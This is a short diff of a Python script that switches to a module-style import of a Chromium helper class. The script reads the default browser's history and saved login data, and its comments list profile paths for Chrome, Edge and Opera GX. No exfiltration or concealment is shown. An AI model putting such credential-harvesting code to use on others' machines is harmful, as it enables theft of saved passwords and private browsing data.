@@ -2,16 +2,16 @@ import sys
 import os
 import json
 
-from chromiumBrowser import Chromium
+import chromiumBrowser
 import dataComprehention
 import getBrowser
 
 chromiumParams = getBrowser.getChromiumParams()
-defaultBrowser = Chromium(chromiumParams[0], chromiumParams[1], chromiumParams[2], chromiumParams[3])
+defaultBrowser = chromiumBrowser.Chromium(chromiumParams[0], chromiumParams[1], chromiumParams[2], chromiumParams[3])
 
-#googleChrome = Chromium("LOCALAPPDATA", "Default", "Google\\Chrome\\User Data", "GoogleChrome")
-#microsoftEdge = Chromium("LOCALAPPDATA", "Default", "Microsoft\\Edge\\User Data", "MicrosoftEdge")
-#operaGX = Chromium("APPDATA", "", "Opera Software\\Opera GX Stable", "OperaGX")
+#googleChrome = chromiumBrowser.Chromium("LOCALAPPDATA", "Default", "Google\\Chrome\\User Data", "GoogleChrome")
+#microsoftEdge = chromiumBrowser.Chromium("LOCALAPPDATA", "Default", "Microsoft\\Edge\\User Data", "MicrosoftEdge")
+#operaGX = chromiumBrowser.Chromium("APPDATA", "", "Opera Software\\Opera GX Stable", "OperaGX")
 
 history = defaultBrowser.getHistory()
 loginData = defaultBrowser.getLoginData()
